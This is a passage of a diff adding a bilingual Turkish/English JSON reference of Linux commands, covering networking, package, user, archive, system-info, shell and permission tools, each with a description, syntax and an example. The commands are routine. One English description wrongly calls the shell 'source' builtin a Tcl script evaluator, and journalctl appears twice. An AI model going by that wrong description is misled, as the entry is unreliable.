+            "tr": "Paket rotasını göster",
+            "en": "Show packet route"
+          }
+        ]
+      },
+      {
+        "name": "dig",
+        "tr": "DNS aracı.",
+        "en": "DNS lookup utility.",
+        "syntax": "dig [@server] [name] [type]",
+        "ex": [
+          {
+            "c": "dig example.com",
+            "tr": "DNS kayıtlarını sorgula",
+            "en": "Query DNS records"
+          }
+        ]
+      },
+      {
+        "name": "nslookup",
+        "tr": "İnternet isim sunucularını etkileşimli sorgular.",
+        "en": "Query Internet name servers interactively.",
+        "syntax": "nslookup [name] [server]",
+        "ex": [
+          {
+            "c": "nslookup example.com",
+            "tr": "Alan adı IP adresini bul",
+            "en": "Find domain IP address"
+          }
+        ]
+      },
+      {
+        "name": "route",
+        "tr": "IP yönlendirme tablosunu gösterir veya değiştirir.",
+        "en": "Show / manipulate the IP routing table.",
+        "syntax": "route [options]",
+        "ex": [
+          {
+            "c": "route -n",
+            "tr": "Yönlendirme tablosunu sayısal göster",
+            "en": "Show routing table numerically"
+          }
+        ]
+      },
+      {
+        "name": "nc",
+        "tr": "Ağ bağlantıları için genel amaçlı araç (netcat).",
+        "en": "Arbitrary TCP and UDP connections and listens.",
+        "syntax": "nc [options] [hostname] [port]",
+        "ex": [
+          {
+            "c": "nc -vz localhost 80",
+            "tr": "Portun açık olup olmadığını kontrol et",
+            "en": "Check if port is open"
+          }
+        ]
+      },
+      {
+        "name": "tcpdump",
+        "tr": "Ağdaki trafik paketlerini yakalar ve inceler.",
+        "en": "Dump traffic on a network.",
+        "syntax": "tcpdump [options]",
+        "ex": [
+          {
+            "c": "sudo tcpdump -i eth0",
+            "tr": "eth0 arayüzündeki trafiği dinle",
+            "en": "Listen to traffic on eth0"
+          }
+        ]
+      },
+      {
+        "name": "mtr",
+        "tr": "Ağ tanılama aracı (ping ve traceroute birleşimi).",
+        "en": "A network diagnostic tool.",
+        "syntax": "mtr [options] hostname",
+        "ex": [
+          {
+            "c": "mtr google.com",
+            "tr": "Sürekli izleme yap",
+            "en": "Continuous network trace"
+          }
+        ]
+      },
+      {
+        "name": "whois",
+        "tr": "Alan adı veya IP adresi sahiplik bilgilerini sorgular.",
+        "en": "Client for the whois directory service.",
+        "syntax": "whois [options] object",
+        "ex": [
+          {
+            "c": "whois example.com",
+            "tr": "Alan adı kütük bilgilerini getir",
+            "en": "Get domain registry info"
+          }
+        ]
+      },
+      {
+        "name": "showmount",
+        "tr": "NFS sunucusundaki dışa aktarılan (paylaşılan) dizinleri listeler.",
+        "en": "Show mount information for an NFS server.",
+        "syntax": "showmount [-adevd] [host]",
+        "ex": [
+          {
+            "c": "showmount -e 192.168.1.10",
+            "tr": "Hedefteki paylaşılan NFS dizinlerini listele",
+            "en": "List exported NFS directories on target"
+          }
+        ]
+      }
+    ]
+  },
+  {
+    "cat": "packageManagement",
+    "cmds": [
+      {
+        "name": "apt",
+        "tr": "Komut satırı paket yöneticisi.",
+        "en": "Command-line package manager.",
+        "syntax": "apt [options] command",
+        "ex": [
+          {
+            "c": "apt update && apt upgrade",
+            "tr": "Sistemi güncelle",
+            "en": "Update system"
+          },
+          {
+            "c": "apt install nginx",
+            "tr": "Paket yükle",
+            "en": "Install package"
+          }
+        ]
+      },
+      {
+        "name": "apt-get",
+        "tr": "APT paket yönetimi aracı.",
+        "en": "APT package handling utility.",
+        "syntax": "apt-get [options] command",
+        "ex": [
+          {
+            "c": "apt-get install curl",
+            "tr": "Paket yükle",
+            "en": "Install package"
+          }
+        ]
+      },
+      {
+        "name": "dpkg",
+        "tr": "Debian paket yöneticisi.",
+        "en": "Package manager for Debian.",
+        "syntax": "dpkg [option...] action",
+        "ex": [
+          {
+            "c": "dpkg -i package.deb",
+            "tr": "Deb paketi kur",
+            "en": "Install deb package"
+          }
+        ]
+      },
+      {
+        "name": "snap",
+        "tr": "Snap paketlerini yönetir.",
+        "en": "Tool to interact with snaps.",
+        "syntax": "snap [OPTIONS] <command>",
+        "ex": [
+          {
+            "c": "snap install vlc",
+            "tr": "Snap paketi yükle",
+            "en": "Install snap package"
+          }
+        ]
+      },
+      {
+        "name": "yum",
+        "tr": "Etkileşimli rpm paket yöneticisi.",
+        "en": "Yellowdog Updater Modified.",
+        "syntax": "yum [options] [command] [package ...]",
+        "ex": [
+          {
+            "c": "yum install git",
+            "tr": "Paket yükle",
+            "en": "Install package"
+          }
+        ]
+      },
+      {
+        "name": "dnf",
+        "tr": "RPM tabanlı sistemler için paket yöneticisi.",
+        "en": "DNF Package Manager.",
+        "syntax": "dnf [options] <command> [<args>...]",
+        "ex": [
+          {
+            "c": "dnf install htop",
+            "tr": "Paket yükle",
+            "en": "Install package"
+          }
+        ]
+      },
+      {
+        "name": "rpm",
+        "tr": "RPM Paket Yöneticisi.",
+        "en": "RPM Package Manager.",
+        "syntax": "rpm [OPTION...] [FILE]",
+        "ex": [
+          {
+            "c": "rpm -ivh package.rpm",
+            "tr": "RPM paketi kur",
+            "en": "Install RPM package"
+          }
+        ]
+      },
+      {
+        "name": "pacman",
+        "tr": "Arch Linux paket yöneticisi.",
+        "en": "Arch Linux package manager.",
+        "syntax": "pacman <operation> [options] [targets]",
+        "ex": [
+          {
+            "c": "pacman -Syu",
+            "tr": "Sistemi güncelle",
+            "en": "Update system"
+          }
+        ]
+      },
+      {
+        "name": "zypper",
+        "tr": "openSUSE paket yöneticisi.",
+        "en": "Command-line interface to ZYpp system management library (openSUSE).",
+        "syntax": "zypper [global-options] command [command-options] [arguments]",
+        "ex": [
+          {
+            "c": "zypper install nano",
+            "tr": "Paket yükle",
+            "en": "Install package"
+          }
+        ]
+      },
+      {
+        "name": "emerge",
+        "tr": "Gentoo paket yöneticisi.",
+        "en": "Command-line interface to the Portage system.",
+        "syntax": "emerge [options] [action] [ebuild | tbz2file | file | @set | atom] ...",
+        "ex": [
+          {
+            "c": "emerge --sync",
+            "tr": "Paket ağacını senkronize et",
+            "en": "Sync package tree"
+          }
+        ]
+      },
+      {
+        "name": "flatpak",
+        "tr": "Uygulamaları kurun ve yönetin.",
+        "en": "Build, install and run applications and runtimes.",
+        "syntax": "flatpak [OPTION…] COMMAND",
+        "ex": [
+          {
+            "c": "flatpak install flathub org.gimp.GIMP",
+            "tr": "Flatpak uygulaması yükle",
+            "en": "Install flatpak app"
+          }
+        ]
+      },
+      {
+        "name": "apk",
+        "tr": "Alpine Linux paket yöneticisi.",
+        "en": "Alpine Package Keeper.",
+        "syntax": "apk [<OPTIONS>...] COMMAND [<ARGUMENTS>...]",
+        "ex": [
+          {
+            "c": "apk add curl",
+            "tr": "Paket ekle",
+            "en": "Add package"
+          }
+        ]
+      }
+    ]
+  },
+  {
+    "cat": "userManagement",
+    "cmds": [
+      {
+        "name": "useradd",
+        "tr": "Yeni kullanıcı oluşturur.",
+        "en": "Create a new user.",
+        "syntax": "useradd [options] LOGIN",
+        "ex": [
+          {
+            "c": "useradd -m newuser",
+            "tr": "Ev dizini ile kullanıcı oluştur",
+            "en": "Create user with home directory"
+          }
+        ]
+      },
+      {
+        "name": "usermod",
+        "tr": "Kullanıcı hesabını değiştirir.",
+        "en": "Modify a user account.",
+        "syntax": "usermod [options] LOGIN",
+        "ex": [
+          {
+            "c": "usermod -aG sudo user",
+            "tr": "Kullanıcıyı sudo grubuna ekle",
+            "en": "Add user to sudo group"
+          }
+        ]
+      },
+      {
+        "name": "userdel",
+        "tr": "Kullanıcı hesabını ve ilgili dosyaları siler.",
+        "en": "Delete a user account and related files.",
+        "syntax": "userdel [options] LOGIN",
+        "ex": [
+          {
+            "c": "userdel -r user",
+            "tr": "Kullanıcıyı ve ev dizinini sil",
+            "en": "Delete user and home directory"
+          }
+        ]
+      },
+      {
+        "name": "passwd",
+        "tr": "Kullanıcı şifresini değiştirir.",
+        "en": "Change user password.",
+        "syntax": "passwd [options] [LOGIN]",
+        "ex": [
+          {
+            "c": "passwd user",
+            "tr": "Kullanıcı şifresini değiştir",
+            "en": "Change user password"
+          }
+        ]
+      },
+      {
+        "name": "su",
+        "tr": "Kullanıcı ID'sini değiştirir veya süper kullanıcı olur.",
+        "en": "Change user ID or become superuser.",
+        "syntax": "su [options] [-] [USER [arg]...]",
+        "ex": [
+          {
+            "c": "su - user",
+            "tr": "Kullanıcıya geçiş yap",
+            "en": "Switch to user"
+          }
+        ]
+      },
+      {
+        "name": "sudo",
+        "tr": "Bir komutu başka bir kullanıcı olarak çalıştırır.",
+        "en": "Execute a command as another user.",
+        "syntax": "sudo [options] command",
+        "ex": [
+          {
+            "c": "sudo apt update",
+            "tr": "Yönetici yetkisiyle çalıştır",
+            "en": "Run with admin privileges"
+          }
+        ]
+      },
+      {
+        "name": "groups",
+        "tr": "Bir kullanıcının üye olduğu grupları yazdırır.",
+        "en": "Print the groups a user is in.",
+        "syntax": "groups [OPTION]... [USERNAME]...",
+        "ex": [
+          {
+            "c": "groups user",
+            "tr": "Kullanıcının gruplarını listele",
+            "en": "List user groups"
+          }
+        ]
+      },
+      {
+        "name": "id",
+        "tr": "Gerçek ve etkili kullanıcı ve grup ID'lerini yazdırır.",
+        "en": "Print real and effective user and group IDs.",
+        "syntax": "id [OPTION]... [USER]...",
+        "ex": [
+          {
+            "c": "id user",
+            "tr": "Kullanıcı kimlik bilgilerini göster",
+            "en": "Show user ID info"
+          }
+        ]
+      },
+      {
+        "name": "who",
+        "tr": "Kimlerin oturum açtığını gösterir.",
+        "en": "Show who is logged on.",
+        "syntax": "who [OPTION]... [ FILE | ARG1 ARG2 ]",
+        "ex": [
+          {
+            "c": "who",
+            "tr": "Oturum açanları listele",
+            "en": "List logged in users"
+          }
+        ]
+      },
+      {
+        "name": "w",
+        "tr": "Kimlerin çevrimiçi olduğunu ve ne yaptıklarını gösterir.",
+        "en": "Show who is logged on and what they are doing.",
+        "syntax": "w [options] [user]",
+        "ex": [
+          {
+            "c": "w",
+            "tr": "Kullanıcı etkinliklerini göster",
+            "en": "Show user activities"
+          }
+        ]
+      },
+      {
+        "name": "last",
+        "tr": "Son oturum açan kullanıcıları listeler.",
+        "en": "Show a listing of last logged in users.",
+        "syntax": "last [options] [username...] [tty...]",
+        "ex": [
+          {
+            "c": "last",
+            "tr": "Oturum açma geçmişini göster",
+            "en": "Show login history"
+          }
+        ]
+      },
+      {
+        "name": "chsh",
+        "tr": "Kullanıcının oturum açma kabuğunu değiştirir.",
+        "en": "Change login shell.",
+        "syntax": "chsh [options] [LOGIN]",
+        "ex": [
+          {
+            "c": "chsh -s /bin/zsh",
+            "tr": "Varsayılan kabuğu değiştir",
+            "en": "Change default shell"
+          }
+        ]
+      },
+      {
+        "name": "chfn",
+        "tr": "Kullanıcının parmak izi (finger) bilgilerini değiştirir.",
+        "en": "Change real user name and information.",
+        "syntax": "chfn [options] [LOGIN]",
+        "ex": [
+          {
+            "c": "chfn user",
+            "tr": "Kullanıcı bilgilerini düzenle",
+            "en": "Edit user information"
+          }
+        ]
+      },
+      {
+        "name": "lastlog",
+        "tr": "Tüm kullanıcıların son oturum açma zamanlarını bildirir.",
+        "en": "Report the most recent login of all users or of a given user.",
+        "syntax": "lastlog [options]",
+        "ex": [
+          {
+            "c": "lastlog",
+            "tr": "Son girişleri listele",
+            "en": "List last logins"
+          }
+        ]
+      }
+    ]
+  },
+  {
+    "cat": "archiving",
+    "cmds": [
+      {
+        "name": "tar",
+        "tr": "Arşiv oluşturma ve açma aracı.",
+        "en": "An archiving utility.",
+        "syntax": "tar [OPTION...] [FILE]...",
+        "ex": [
+          {
+            "c": "tar -cvf archive.tar folder/",
+            "tr": "Arşiv oluştur",
+            "en": "Create archive"
+          },
+          {
+            "c": "tar -xvf archive.tar",
+            "tr": "Arşivi çıkar",
+            "en": "Extract archive"
+          }
+        ]
+      },
+      {
+        "name": "gzip",
+        "tr": "Dosyaları sıkıştırır.",
+        "en": "Compress or expand files.",
+        "syntax": "gzip [OPTION]... [FILE]...",
+        "ex": [
+          {
+            "c": "gzip file.txt",
+            "tr": "Dosyayı sıkıştır",
+            "en": "Compress file"
+          }
+        ]
+      },
+      {
+        "name": "gunzip",
+        "tr": "Sıkıştırılmış dosyaları açar.",
+        "en": "Compress or expand files.",
+        "syntax": "gunzip [OPTION]... [FILE]...",
+        "ex": [
+          {
+            "c": "gunzip file.txt.gz",
+            "tr": "Dosyayı arşivden çıkar",
+            "en": "Decompress file"
+          }
+        ]
+      },
+      {
+        "name": "zip",
+        "tr": "Dosyaları paketler ve sıkıştırır.",
+        "en": "Package and compress (archive) files.",
+        "syntax": "zip [options] [zipfile [file...]]",
+        "ex": [
+          {
+            "c": "zip -r archive.zip folder/",
+            "tr": "Klasörü zip yap",
+            "en": "Zip a directory"
+          }
+        ]
+      },
+      {
+        "name": "unzip",
+        "tr": "ZIP dosyalarını açar.",
+        "en": "List, test and extract compressed files in a ZIP archive.",
+        "syntax": "unzip file[.zip]",
+        "ex": [
+          {
+            "c": "unzip archive.zip",
+            "tr": "ZIP dosyasını çıkar",
+            "en": "Extract ZIP file"
+          }
+        ]
+      },
+      {
+        "name": "bzip2",
+        "tr": "Blok sıralamalı dosya sıkıştırıcı.",
+        "en": "A block-sorting file compressor.",
+        "syntax": "bzip2 [filenames...]",
+        "ex": [
+          {
+            "c": "bzip2 file.txt",
+            "tr": "Dosyayı bz2 olarak sıkıştır",
+            "en": "Compress file as bz2"
+          }
+        ]
+      },
+      {
+        "name": "xz",
+        "tr": "XZ ve LZMA sıkıştırma aracı.",
+        "en": "Compress or decompress .xz and .lzma files.",
+        "syntax": "xz [option...]  [file...]",
+        "ex": [
+          {
+            "c": "xz file.txt",
+            "tr": "Dosyayı xz ile sıkıştır",
+            "en": "Compress file with xz"
+          }
+        ]
+      },
+      {
+        "name": "7z",
+        "tr": "Yüksek sıkıştırma oranlı dosya arşivleyici.",
+        "en": "A file archiver with highest compression ratio.",
+        "syntax": "7z <command> <archive_name> [<file_names>...]",
+        "ex": [
+          {
+            "c": "7z a archive.7z folder/",
+            "tr": "7z arşivi oluştur",
+            "en": "Create 7z archive"
+          }
+        ]
+      },
+      {
+        "name": "cpio",
+        "tr": "Dosyaları kopyalar ve arşiv oluşturur.",
+        "en": "Copy files to and from archives.",
+        "syntax": "cpio [OPTION...] [destination-directory]",
+        "ex": [
+          {
+            "c": "ls | cpio -ov > archive.cpio",
+            "tr": "Cpio arşivi oluştur",
+            "en": "Create cpio archive"
+          }
+        ]
+      },
+      {
+        "name": "dd",
+        "tr": "Dosya dönüştürür ve kopyalar (genellikle imaj almak için).",
+        "en": "Convert and copy a file.",
+        "syntax": "dd [OPERAND]...",
+        "ex": [
+          {
+            "c": "dd if=/dev/sda of=backup.img",
+            "tr": "Diskin imajını al",
+            "en": "Create disk image"
+          }
+        ]
+      },
+      {
+        "name": "zstd",
+        "tr": "Zstandard - Hızlı gerçek zamanlı sıkıştırma algoritması.",
+        "en": "Zstandard - Fast real-time compression algorithm.",
+        "syntax": "zstd [OPTIONS] [-|INPUT-FILE] [-o OUTPUT-FILE]",
+        "ex": [
+          {
+            "c": "zstd file.txt",
+            "tr": "Dosyayı zstd ile sıkıştır",
+            "en": "Compress file with zstd"
+          }
+        ]
+      }
+    ]
+  },
+  {
+    "cat": "systemInfo",
+    "cmds": [
+      {
+        "name": "uname",
+        "tr": "Sistem bilgilerini yazdırır.",
+        "en": "Print system information.",
+        "syntax": "uname [OPTION]...",
+        "ex": [
+          {
+            "c": "uname -a",
+            "tr": "Tüm sistem bilgilerini göster",
+            "en": "Show all system info"
+          }
+        ]
+      },
+      {
+        "name": "uptime",
+        "tr": "Sistemin ne kadar süredir çalıştığını söyler.",
+        "en": "Tell how long the system has been running.",
+        "syntax": "uptime [options]",
+        "ex": [
+          {
+            "c": "uptime",
+            "tr": "Çalışma süresini göster",
+            "en": "Show uptime"
+          }
+        ]
+      },
+      {
+        "name": "free",
+        "tr": "Boş ve kullanılan bellek miktarını gösterir.",
+        "en": "Display amount of free and used memory in the system.",
+        "syntax": "free [options]",
+        "ex": [
+          {
+            "c": "free -h",
+            "tr": "Bellek kullanımını göster",
+            "en": "Show memory usage"
+          }
+        ]
+      },
+      {
+        "name": "lscpu",
+        "tr": "CPU mimarisi hakkında bilgi gösterir.",
+        "en": "Display information about the CPU architecture.",
+        "syntax": "lscpu [options]",
+        "ex": [
+          {
+            "c": "lscpu",
+            "tr": "İşlemci detaylarını göster",
+            "en": "Show CPU details"
+          }
+        ]
+      },
+      {
+        "name": "lsblk",
+        "tr": "Blok cihazları listeler.",
+        "en": "List block devices.",
+        "syntax": "lsblk [options] [device...]",
+        "ex": [
+          {
+            "c": "lsblk",
+            "tr": "Disk bölümlerini listele",
+            "en": "List disk partitions"
+          }
+        ]
+      },
+      {
+        "name": "lshw",
+        "tr": "Donanım konfigürasyonunu listeler.",
+        "en": "List hardware configuration.",
+        "syntax": "lshw [ -format ] [ -options ...  ]",
+        "ex": [
+          {
+            "c": "sudo lshw -short",
+            "tr": "Kısa donanım özeti göster",
+            "en": "Show short hardware summary"
+          }
+        ]
+      },
+      {
+        "name": "dmidecode",
+        "tr": "Bilgisayarın DMI tablo içeriklerini çözer.",
+        "en": "DMI table decoder.",
+        "syntax": "dmidecode [OPTIONS]",
+        "ex": [
+          {
+            "c": "sudo dmidecode -t memory",
+            "tr": "RAM bilgilerini göster",
+            "en": "Show RAM info"
+          }
+        ]
+      },
+      {
+        "name": "dmesg",
+        "tr": "Çekirdek ring tamponunu yazdırır veya kontrol eder.",
+        "en": "Print or control the kernel ring buffer.",
+        "syntax": "dmesg [options]",
+        "ex": [
+          {
+            "c": "dmesg | tail",
+            "tr": "Son çekirdek loglarını göster",
+            "en": "Show latest kernel logs"
+          }
+        ]
+      },
+      {
+        "name": "journalctl",
+        "tr": "Systemd loglarını sorgular.",
+        "en": "Query the systemd journal.",
+        "syntax": "journalctl [OPTIONS...]",
+        "ex": [
+          {
+            "c": "journalctl -u nginx",
+            "tr": "Nginx loglarını göster",
+            "en": "Show nginx logs"
+          }
+        ]
+      },
+      {
+        "name": "vmstat",
+        "tr": "Sanal bellek istatistiklerini raporlar.",
+        "en": "Report virtual memory statistics.",
+        "syntax": "vmstat [options] [delay [count]]",
+        "ex": [
+          {
+            "c": "vmstat 1",
+            "tr": "Sistem durumunu saniyede bir güncelle",
+            "en": "Update system status every second"
+          }
+        ]
+      },
+      {
+        "name": "iostat",
+        "tr": "Merkezi işlem birimi (CPU) istatistiklerini ve cihazlar için giriş/çıkış istatistiklerini raporlar.",
+        "en": "Report CPU and I/O statistics.",
+        "syntax": "iostat [options] [interval [count]]",
+        "ex": [
+          {
+            "c": "iostat -x 2",
+            "tr": "Genişletilmiş disk istatistiklerini izle",
+            "en": "Watch extended disk stats"
+          }
+        ]
+      },
+      {
+        "name": "hostnamectl",
+        "tr": "Sistem ana bilgisayar adını (hostname) kontrol eder.",
+        "en": "Control the system hostname.",
+        "syntax": "hostnamectl [OPTIONS...] COMMAND ...",
+        "ex": [
+          {
+            "c": "hostnamectl set-hostname newname",
+            "tr": "Bilgisayar adını değiştir",
+            "en": "Change computer name"
+          }
+        ]
+      },
+      {
+        "name": "timedatectl",
+        "tr": "Sistem saatini ve tarihini kontrol eder.",
+        "en": "Control the system time and date.",
+        "syntax": "timedatectl [OPTIONS...] COMMAND ...",
+        "ex": [
+          {
+            "c": "timedatectl status",
+            "tr": "Saat ve tarih durumunu gör",
+            "en": "View time and date status"
+          }
+        ]
+      },
+      {
+        "name": "cal",
+        "tr": "Bir takvim gösterir.",
+        "en": "Display a calendar.",
+        "syntax": "cal [options] [[[day] month] year]",
+        "ex": [
+          {
+            "c": "cal",
+            "tr": "Geçerli ayın takvimini göster",
+            "en": "Show calendar for current month"
+          }
+        ]
+      },
+      {
+        "name": "lsof (Açık Dosyaları Listeleme)",
+        "tr": "Sistemde anlık olarak açık olan tüm dosyaları ve bu dosyaları/portları kullanan süreçleri (process) gösterir.",
+        "en": "Lists all currently open files in the system and the processes using those files/ports.",
+        "syntax": "lsof [seçenekler]",
+        "ex": [
+          {
+            "c": "sudo lsof -i :80",
+            "tr": "80 (HTTP) numaralı portu hangi uygulamanın (örn: Apache veya Nginx) dinlediğini ve kullandığını göster.",
+            "en": "Show which application (e.g., Apache or Nginx) is listening on and using port 80 (HTTP)."
+          },
+          {
+            "c": "lsof +D /var/log",
+            "tr": "Belirli bir dizinin (/var/log) altında o an hangi dosyaların hangi süreçler tarafından açık tutulduğunu listele.",
+            "en": "List which files under a specific directory (/var/log) are currently kept open by which processes."
+          }
+        ]
+      },
+      {
+        "name": "strace (Sistem Çağrısı İzleme)",
+        "tr": "Bir programın işletim sistemiyle nasıl konuştuğunu (System Calls) izleyerek, çökme veya hata ayıklama (debugging) işlemlerinde kullanılır.",
+        "en": "Tracks how a program communicates with the OS (System Calls), used for debugging crashes or errors.",
+        "syntax": "strace [komut]",
+        "ex": [
+          {
+            "c": "strace ls",
+            "tr": "'ls' komutu çalışırken arka planda çekirdeğe (kernel) hangi dosyaları açma veya okuma istekleri gönderdiğini saniye saniye izle.",
+            "en": "Watch step-by-step which file open/read requests the 'ls' command sends to the kernel while running."
+          },
+          {
+            "c": "strace -p 1234",
+            "tr": "Hali hazırda çalışan 1234 numaralı sürece (PID) kanca at ve şu an ne yapmaya çalıştığını canlı izle.",
+            "en": "Hook into the already running process 1234 (PID) and watch live what it's trying to do."
+          }
+        ]
+      },
+      {
+        "name": "journalctl (Sistem Logları)",
+        "tr": "Modern Linux sistemlerinde (systemd kullanan) Kernel ve servis günlüklerini (loglarını) okumak için kullanılır.",
+        "en": "Used to read Kernel and service logs in modern Linux systems (using systemd).",
+        "syntax": "journalctl [seçenekler]",
+        "ex": [
+          {
+            "c": "journalctl -u sshd.service -f",
+            "tr": "Sadece SSH servisine ait logları filtrele ve yeni log geldikçe canlı (-f) olarak ekrana yansıt.",
+            "en": "Filter logs only for SSH service and follow (-f) them live as new logs arrive."
+          },
+          {
+            "c": "journalctl --since \"1 hour ago\"",
+            "tr": "Sistem genelinde sadece son 1 saat içinde oluşan tüm hataları ve kayıtları getir.",
+            "en": "Fetch all system-wide errors and records generated only within the last 1 hour."
+          }
+        ]
+      }
+    ]
+  },
+  {
+    "cat": "shellScripting",
+    "cmds": [
+      {
+        "name": "echo",
+        "tr": "Metin satırı yazdırır.",
+        "en": "Display a line of text.",
+        "syntax": "echo [SHORT-OPTION]... [STRING]...",
+        "ex": [
+          {
+            "c": "echo 'Hello'",
+            "tr": "Ekrana metin yazdır",
+            "en": "Print text to screen"
+          }
+        ]
+      },
+      {
+        "name": "read",
+        "tr": "Standart girdiden bir satır okur.",
+        "en": "Read a line from standard input.",
+        "syntax": "read [-p prompt] [name ...]",
+        "ex": [
+          {
+            "c": "read -p 'Name: ' name",
+            "tr": "Kullanıcıdan girdi al",
+            "en": "Get user input"
+          }
+        ]
+      },
+      {
+        "name": "export",
+        "tr": "Çevresel değişkenleri ayarlar.",
+        "en": "Set an environment variable.",
+        "syntax": "export [name[=word]] ...",
+        "ex": [
+          {
+            "c": "export PATH=$PATH:/new/path",
+            "tr": "Yola yeni dizin ekle",
+            "en": "Add directory to PATH"
+          }
+        ]
+      },
+      {
+        "name": "env",
+        "tr": "Modifiye edilmiş bir çevrede komut çalıştırır.",
+        "en": "Run a program in a modified environment.",
+        "syntax": "env [OPTION]... [-] [NAME=VALUE]... [COMMAND [ARG]...]",
+        "ex": [
+          {
+            "c": "env",
+            "tr": "Çevresel değişkenleri listele",
+            "en": "List environment variables"
+          }
+        ]
+      },
+      {
+        "name": "alias",
+        "tr": "Komutlar için takma ad oluşturur.",
+        "en": "Define or display aliases.",
+        "syntax": "alias [-p] [name[=value] ... ]",
+        "ex": [
+          {
+            "c": "alias ll='ls -alF'",
+            "tr": "Kısayol oluştur",
+            "en": "Create shortcut"
+          }
+        ]
+      },
+      {
+        "name": "history",
+        "tr": "Komut geçmişini gösterir.",
+        "en": "Display or manipulate the history list.",
+        "syntax": "history",
+        "ex": [
+          {
+            "c": "history | grep 'ssh'",
+            "tr": "Geçmişte komut ara",
+            "en": "Search command in history"
+          }
+        ]
+      },
+      {
+        "name": "source",
+        "tr": "Bir dosyadan komut okur ve çalıştırır.",
+        "en": "Evaluate a file or resource as a Tcl script.",
+        "syntax": "source filename [arguments]",
+        "ex": [
+          {
+            "c": "source ~/.bashrc",
+            "tr": "Yapılandırmayı yeniden yükle",
+            "en": "Reload configuration"
+          }
+        ]
+      },
+      {
+        "name": "cron",
+        "tr": "Zamanlanmış görevleri çalıştıran servis.",
+        "en": "Daemon to execute scheduled commands (Vixie Cron).",
+        "syntax": "cron [-f] [-l] [-L loglevel]",
+        "ex": [
+          {
+            "c": "crontab -e",
+            "tr": "Zamanlanmış görevleri düzenle",
+            "en": "Edit scheduled tasks"
+          }
+        ]
+      },
+      {
+        "name": "at",
+        "tr": "Komutları daha sonra çalıştırmak için kuyruğa alır.",
+        "en": "Queue, examine or delete jobs for later execution.",
+        "syntax": "at [-V] [-q queue] [-f file] [-mMlv] timespec ...",
+        "ex": [
+          {
+            "c": "echo 'reboot' | at now + 1 hour",
+            "tr": "1 saat sonra yeniden başlat",
+            "en": "Reboot after 1 hour"
+          }
+        ]
+      },
+      {
+        "name": "xargs",
+        "tr": "Standart girdiden komutlar oluşturur ve çalıştırır.",
+        "en": "Build and execute command lines from standard input.",
+        "syntax": "xargs [options] [command [initial-arguments]]",
+        "ex": [
+          {
+            "c": "find . -name '*.bak' | xargs rm",
+            "tr": "Bulunan dosyaları sil",
+            "en": "Delete found files"
+          }
+        ]
+      },
+      {
+        "name": "tee",
+        "tr": "Standart girdiyi okur ve hem standart çıktıya hem dosyalara yazar.",
+        "en": "Read from standard input and write to standard output and files.",
+        "syntax": "tee [OPTION]... [FILE]...",
+        "ex": [
+          {
+            "c": "echo 'text' | tee file.txt",
+            "tr": "Ekrana ve dosyaya yazdır",
+            "en": "Print to screen and file"
+          }
+        ]
+      },
+      {
+        "name": "watch",
+        "tr": "Bir komutu periyodik olarak çalıştırıp çıktısını tam ekran gösterir.",
+        "en": "Execute a program periodically, showing output fullscreen.",
+        "syntax": "watch [options] command",
+        "ex": [
+          {
+            "c": "watch -n 1 free -m",
+            "tr": "Bellek kullanımını her saniye yenile",
+            "en": "Refresh memory usage every second"
+          }
+        ]
+      },
+      {
+        "name": "printf",
+        "tr": "Veriyi biçimlendirir ve yazdırır.",
+        "en": "Format and print data.",
+        "syntax": "printf FORMAT [ARGUMENT]...",
+        "ex": [
+          {
+            "c": "printf 'Hello %s\\n' 'World'",
+            "tr": "Biçimlendirilmiş çıktı yazdır",
+            "en": "Print formatted output"
+          }
+        ]
+      },
+      {
+        "name": "test",
+        "tr": "Dosya türlerini kontrol eder ve değerleri karşılaştırır.",
+        "en": "Check file types and compare values.",
+        "syntax": "test EXPRESSION",
+        "ex": [
+          {
+            "c": "test -f file.txt && echo 'Exists'",
+            "tr": "Dosya varsa yazdır",
+            "en": "Print if file exists"
+          }
+        ]
+      },
+      {
+        "name": "expr",
+        "tr": "İfadeleri değerlendirir.",
+        "en": "Evaluate expressions.",
+        "syntax": "expr EXPRESSION",
+        "ex": [
+          {
+            "c": "expr 5 + 3",
+            "tr": "Matematiksel işlemi yap",
+            "en": "Evaluate math expression"
+          }
+        ]
+      },
+      {
+        "name": "sleep",
+        "tr": "Belirli bir süre bekler.",
+        "en": "Delay for a specified amount of time.",
+        "syntax": "sleep NUMBER[SUFFIX]...",
+        "ex": [
+          {
+            "c": "sleep 5s",
+            "tr": "5 saniye bekle",
+            "en": "Wait for 5 seconds"
+          }
+        ]
+      },
+      {
+        "name": "unalias",
+        "tr": "Oluşturulan takma adları (alias) kaldırır.",
+        "en": "Remove alias definitions.",
+        "syntax": "unalias [-a] name [name ...]",
+        "ex": [
+          {
+            "c": "unalias ll",
+            "tr": "ll kısayolunu kaldır",
+            "en": "Remove ll alias"
+          }
+        ]
+      },
+      {
+        "name": "type",
+        "tr": "Bir komutun nasıl yorumlanacağını gösterir.",
+        "en": "Write a description of the command type.",
+        "syntax": "type [-afptP] name [name ...]",
+        "ex": [
+          {
+            "c": "type ls",
+            "tr": "ls komutunun türünü öğren",
+            "en": "Find out type of ls command"
+          }
+        ]
+      }
+    ]
+  },
+  {
+    "cat": "permissionsSecurity",
+    "cmds": [
+      {
+        "name": "chmod",
+        "tr": "Dosya erişim izinlerini değiştirir.",
+        "en": "Change file mode bits.",
+        "syntax": "chmod [OPTION]... MODE[,MODE]... FILE...",
+        "ex": [
+          {
+            "c": "chmod 755 script.sh",
+            "tr": "Çalıştırma izni ver",
+            "en": "Grant execute permission"
+          }
+        ]
+      },
+      {
+        "name": "chown",
+        "tr": "Dosya sahibi ve grubunu değiştirir.",
+        "en": "Change file owner and group.",
+        "syntax": "chown [OPTION]... [OWNER][:[GROUP]] FILE...",
+        "ex": [
+          {
+            "c": "chown user:group file.txt",
+            "tr": "Sahibi ve grubu değiştir",
+            "en": "Change owner and group"
+          }
+        ]
+      },
+      {
+        "name": "umask",
+        "tr": "Dosya oluşturma maskesini belirler.",
+        "en": "Set file mode creation mask.",
+        "syntax": "umask [-p] [-S] [mode]",
+        "ex": [
+          {
+            "c": "umask 022",
+            "tr": "Varsayılan izinleri ayarla",
+            "en": "Set default permissions"
+          }
+        ]
+      },
+      {
+        "name": "visudo",
+        "tr": "sudoers dosyasını güvenle düzenler.",
+        "en": "Edit the sudoers file.",
+        "syntax": "visudo [-chqsV] [-f sudoers]",
+        "ex": [
+          {
+            "c": "sudo visudo",
+            "tr": "Sudo yetkilerini düzenle",
+            "en": "Edit sudo permissions"
+          }
+        ]
+      },
+      {
+        "name": "iptables",
+        "tr": "IPv4 paket filtreleme ve NAT aracı.",
+        "en": "Administration tool for IPv4 packet filtering and NAT.",
